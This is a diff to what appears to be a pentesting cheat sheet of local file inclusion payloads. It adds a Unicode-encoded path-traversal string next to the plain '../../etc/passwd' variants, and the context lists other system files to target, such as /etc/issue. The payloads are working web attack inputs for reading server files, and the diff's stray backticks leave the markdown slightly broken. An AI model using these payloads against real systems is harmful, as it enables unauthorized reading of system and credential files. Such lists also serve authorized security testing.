@@ -517,10 +517,15 @@ If it does not work you can also add a ?, this way the rest will be interpreted 
 -------------------------------------------------------------------------------------------------------------
 # Local file inclusion (LFI) payloads
 
+* normal
 `../../../../../../etc/passwd`
-
+`
 `....//....//....//....//....//etc/passwd`
-
+`
+* with Unicode charecters
+`
+..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8etc/passwd
+`
 You can also try to use those insted of `/etc/passwd`
 ```
 /etc/issue
